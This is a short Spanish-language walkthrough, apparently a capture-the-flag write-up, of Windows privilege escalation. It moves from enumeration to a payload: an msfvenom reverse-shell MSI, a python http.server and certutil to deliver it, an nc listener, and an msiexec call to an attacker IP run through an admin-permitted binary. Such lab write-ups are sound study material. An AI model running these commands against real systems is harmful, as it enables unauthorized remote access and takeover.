Root.txt

Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.

Miramos nuestros prvilegios:
    - whoami /all
    - net user username

Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
    net localgroup group_name 

En la descripcion pone que podemos ejecutar el binario wuauclt.exe con privilegios administrador de la siguiente forma:
C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'

Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
Y nos pone lo que tenemos que hacer para realizar la escalada.


Creamos el .msi malicioso con msfvenom:
msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=IP LPORT=PORT -f msi > cmd.msi

Ahora lo subimos a la maquina:
abrir servicio web en el directorio en donde tenemos los archivos anteriores:
    - python3 -m http.server
descargar el archivo:
    - certutil -f -urlcache -split http://IP:PORT/cmd.msi -> El PORT suele ser el 8000 por defecto.



Ahora que ya esta todo preparado, ejecutamos el binario como dice lolbas:
En nuestra terminal de linux ejecutamos:
    - nc -lvp PORT 

Este es el comando:
    - msiexec.exe /q /i http://IP/cmd.msi
pero tenemos que poner lo siguiente:
    -  C:\Users\Administrator\Desktop\script.exe -ArgumentList '/q /i http://IP/cmd.msi'

